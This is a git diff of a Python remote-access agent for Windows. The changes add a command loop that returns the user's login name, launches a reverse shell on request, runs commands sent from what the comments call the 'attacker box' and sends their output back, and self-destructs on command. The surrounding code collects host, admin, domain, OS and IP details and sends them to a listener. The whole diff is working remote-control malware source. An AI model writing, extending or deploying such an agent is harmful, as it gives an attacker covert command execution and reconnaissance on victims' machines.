@@ -12,6 +12,8 @@ import time
 from win32com.shell import shell
 exit_event = threading.Event()
 
+
+
 # Reverse shell function
 
 def startrevshellcli():
@@ -26,14 +28,45 @@ def startrevshellcli():
 def reciever(client):
     while True:
         try:
-            # Checks if the agent is alive and recieving data
-            data = client.recv(1024)
+            #this checks to see if the agent is still alive and receiving data
+            data=client.recv(1024)
         except:
-            print("[-] Connection to server lost...")
-            client.close
-            os.exit(0)
-        data=data.decode('utf-8') # Get commands we're sending from the attack box
-
+            print("[-] Connection to server lost.")
+            client.close()
+            os._exit(0) 
+        data=data.decode('UTF-8') #get the commands we're sending from the attacker box
+        
+        if ":msg:" in data:
+            print(data)
+    
+        if ":whoami:" in data:
+            whoami=os.getlogin()
+            client.send(whoami.encode())
+       
+        if ":shell:" in data: #start the reverse shell!
+            exit_event.clear()
+            
+            handler_thread2 = threading.Thread(target=startrevshellcli)
+            handler_thread2.daemon = True
+            handler_thread2.start()
+            while not exit_event.is_set():
+                time.sleep(1)
+        if "ifconfig" in data: # gets public ip
+            command=data.split("\n")
+            command=command[1]
+            print("command: ", command)
+            proc = subprocess.Popen(command,
+                            stdin=subprocess.PIPE,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE)
+            client.send(b"returned output: \n"+proc.stdout.read())
+            proc.stdin.close()
+            proc.terminate()
+            
+        if "self-destruct" in data: # Kills agent
+            client.close()
+            os._exit(0) 
+        
 
 host="127.0.0.1"
 port=4545
@@ -93,7 +126,7 @@ else:
     info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.coonnect((host, port)) # Connects using port and IP address
+client.connect((host, port)) # Connects using port and IP address
 
 # INFO SENT TO SERVER:
 # if Domain == True:    
